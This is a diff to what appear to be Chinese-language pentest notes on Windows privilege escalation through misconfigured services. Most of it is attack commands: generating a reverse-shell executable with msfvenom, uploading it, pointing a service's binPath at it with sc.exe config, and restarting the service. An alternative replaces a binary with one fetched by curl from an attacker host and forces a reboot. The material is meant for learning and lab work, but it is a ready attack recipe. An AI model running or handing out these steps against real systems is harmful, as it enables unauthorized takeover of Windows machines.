@@ -438,27 +438,48 @@ kali: evil-winrm -i ip -u Adminstrator -H hash # :后半部分
 
 5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令
 ```cmd
-iscacls E:\mysql\bin\mysql.exe
-# 权限级别
-# F - 完全控制
-# M - 修改
-# RX - 读取和执行
-# R - 只读
-# W - 只写
-# 3D - 删除
-那么如何提权
-1. msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
-2. upload shell.exe(evil下使用)
-3. sc.exe config vss binPath="path"
-# road是你shell.exe下载到的路径
-4. sc.exe stop vss
-5. sc.exe start vss
-# 这里需要你有可以停止和启动的权限(server operators)
-# vss是默认包含服务，这里的vss就是你有权限停止或开始的项目
-# 如果有权利shutdown，那么可以将此exe文件替换成反弹shell文件，最后shutdown -r
+icacls E:\mysql\bin\mysql.exe
+```
+
+### 权限级别说明
+- **F** - 完全控制
+- **M** - 修改  
+- **RX** - 读取和执行
+- **R** - 只读
+- **W** - 只写
+- **D** - 删除
+
+### 提权步骤
+
+1. **生成反弹shell**
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
+```
+
+2. **上传文件**（msf中执行）
+```msf
+upload shell.exe
+```
+
+3. **修改服务binPath**
+```cmd
+sc.exe config vss binPath="C:\path\to\shell.exe"
+```
+> 注：`path`是你shell.exe下载到的路径
+
+4. **重启服务**（需要有Server Operators权限）
+```cmd
+sc.exe stop vss
+sc.exe start vss
+```
+
+### 备选方案：通过重启提权
+
+如果有关机权限，可以替换系统文件后重启：
+
+```cmd
 rename bd.exe bd.exe.bak
 curl http://ip:port/shell.exe -o bd.exe
-# 如果上传不了，在可以下载的地方下载，在复制过去
 copy C:\xampp\htdocs\reverse.exe bd.exe
 shutdown -r -t 0
 ```
